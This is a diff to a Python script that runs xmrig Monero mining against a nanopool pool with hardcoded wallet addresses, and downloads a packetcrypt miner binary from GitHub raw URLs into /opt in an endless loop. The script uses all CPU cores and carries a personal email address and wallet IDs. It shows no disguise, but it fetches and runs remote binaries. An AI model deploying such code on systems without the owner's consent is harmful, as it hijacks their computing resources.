@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-#import multiprocessing
+import multiprocessing
 
 
 if platform == "linux" or platform == "linux2":
@@ -13,10 +13,10 @@ elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'win'
-#cores = multiprocessing.cpu_count()
+cores = multiprocessing.cpu_count()
 #cores = cores - 1
-#if cores <= 0:
-#    cores = 1
+if cores <= 0:
+    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
 
@@ -35,9 +35,8 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
-command_xmrig_default = '--algo randomx --coin=XMR --url=xmr-us-east1.nanopool.org:14433 --user=87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg.vmx/tuyen1321995@gmail.com --cpu-max-threads-hint=100 --tls
-'
+command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
@@ -154,8 +153,8 @@ while True:
         '''
         #pkt
         
-        link_version_pkt = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/vietlai/version_pkt'
-        link_download_pkt = 'https://github.com/rolandmedina54/giautoidi/raw/beta/vietlai/packetcrypt-v0.5.1-linux_amd64'
+        link_version_pkt = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_pkt'
+        link_download_pkt = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/packetcrypt-v0.5.1-linux_amd64'
         pkt_name = 'packetcrypt'
         try:
             if not os.path.isfile('/opt/%s' % pkt_name):
